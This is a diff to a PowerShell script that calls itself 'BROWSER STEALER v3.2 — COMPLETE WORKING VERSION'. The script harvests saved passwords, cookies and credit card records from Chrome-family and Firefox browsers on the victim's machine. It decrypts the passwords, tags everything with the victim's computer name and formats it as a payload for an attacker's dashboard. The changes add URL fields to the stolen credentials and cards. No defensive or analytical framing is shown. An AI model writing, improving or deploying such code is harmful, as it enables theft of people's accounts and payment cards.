@@ -1,6 +1,7 @@
 # ============================================================
-# BROWSER STEALER v3.1 — FIXED CREDENTIAL FORMAT
-# Sends credentials as {name, value, type} to dashboard
+# BROWSER STEALER v3.2 — COMPLETE WORKING VERSION
+# Sends credentials (username/email + password) to dashboard
+# Includes url links for credentials and cards
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -18,7 +19,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "  BROWSER STEALER v3.1"
+Write-Log "  BROWSER STEALER v3.2"
 Write-Log "  Target: $env:COMPUTERNAME"
 Write-Log "  Log: $LOGFILE"
 Write-Log "============================================"
@@ -214,7 +215,7 @@ function Get-FirefoxCookies {
 }
 
 # ============================================================
-# PASSWORD FUNCTIONS — FIXED: returns {name, value, type}
+# PASSWORD FUNCTIONS — WITH URL FIELD
 # ============================================================
 
 function Get-BrowserPasswords {
@@ -242,12 +243,12 @@ function Get-BrowserPasswords {
                 $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($encryptedPassword)
             }
             
-            # ---- FIX: Only add if we have both username and password ----
+            # Only add if we have both username and password
             if ($username -and $decryptedPassword -and $username -ne "" -and $decryptedPassword -ne "") {
                 $u = $r['origin_url']
                 if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                 
-                # ---- FIX: Format as {name, value, type} for dashboard ----
+                # ---- FORMAT: {name, value, type, url} for dashboard ----
                 $pass += @{
                     name = $username
                     value = $decryptedPassword
@@ -278,7 +279,7 @@ function Get-FirefoxPasswords {
                     if ($json.logins) {
                         foreach ($l in $json.logins) {
                             $u = $l.hostname -replace 'https?://', ''
-                            # ---- FIX: Format as {name, value, type} ----
+                            # ---- FORMAT: {name, value, type, url} ----
                             if ($l.username -and $l.password -and $l.username -ne "" -and $l.password -ne "") {
                                 $pass += @{
                                     name = $l.username
@@ -309,7 +310,7 @@ function Get-OperaPasswords {
 }
 
 # ============================================================
-# CREDIT CARD FUNCTIONS
+# CREDIT CARD FUNCTIONS — WITH URL FIELD
 # ============================================================
 
 function Get-BrowserCards {
@@ -321,10 +322,12 @@ function Get-BrowserCards {
         $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
         foreach ($r in $rows) {
             if ($r['name_on_card'] -and $r['card_number_encrypted']) {
+                # ---- FORMAT: {name, value, type, url} ----
                 $cards += @{
                     name = $r['name_on_card']
                     value = $r['card_number_encrypted']
                     type = "card-number"
+                    url = $Name  # Use browser name as fallback domain
                     browser = $Name
                     month = $r['expiration_month']
                     year = $r['expiration_year']
@@ -445,7 +448,7 @@ if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count 
 }
 
 # ============================================================
-# BUILD PAYLOAD — FIXED: credentials use {name, value, type}
+# BUILD PAYLOAD — WITH URL FIELDS
 # ============================================================
 
 $pcName = $env:COMPUTERNAME
@@ -461,10 +464,10 @@ foreach ($c in $allCookies) {
     $cookiesForServer[$key][$c.name] = $c.value
 }
 
-# ---- Credentials are already in {name, value, type} format ----
+# ---- Credentials already have {name, value, type, url} ----
 $credentialsForServer = $allPasswords
 
-# ---- Cards are already in {name, value, type} format ----
+# ---- Cards already have {name, value, type, url} ----
 $cardsForServer = $allCards
 
 $payload = @{
